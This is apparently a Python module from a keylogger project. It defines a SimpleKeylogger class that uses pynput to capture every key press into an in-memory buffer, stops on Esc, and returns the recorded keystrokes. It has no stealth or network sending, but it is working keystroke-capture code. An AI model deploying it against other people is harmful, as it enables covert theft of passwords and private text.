from keylogger.interfaces import KeyloggerInterface
from pynput import keyboard


def key_to_char(key):
    """Converts a pynput key to a printable character."""
    if isinstance(key, keyboard.KeyCode):
        return key.char  # Regular key (letters, numbers, symbols)

    # Mapping for special keys
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.esc: "[ESC]",
    }

    return special_keys.get(key, f"[{key.name}]")  # Default for unknown keys


class SimpleKeylogger(KeyloggerInterface):
    def __init__(self):
        self.buffer = []
        self.running = False
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)

    def on_press(self, key):
        """Callback function for key press event."""
        try:
            self.buffer.append(key_to_char(key))
        except AttributeError:
            self.buffer.append(f"[{key.name}]")

    def on_release(self, key):
        """Callback function for key release event."""
        if key == keyboard.Key.esc:
            self.running = False
            return self.running

    def start(self):
        """Starts listening for keystrokes."""
        self.running = True
        self.listener.start()

    def stop(self):
        """Stops the keylogger."""
        self.running = False
        self.listener.stop()

    def get_log(self):
        """Returns the collected keystrokes."""
        log_data = ""
        for key in self.buffer:
            log_data += str(key)
        self.buffer.clear()
        return log_data
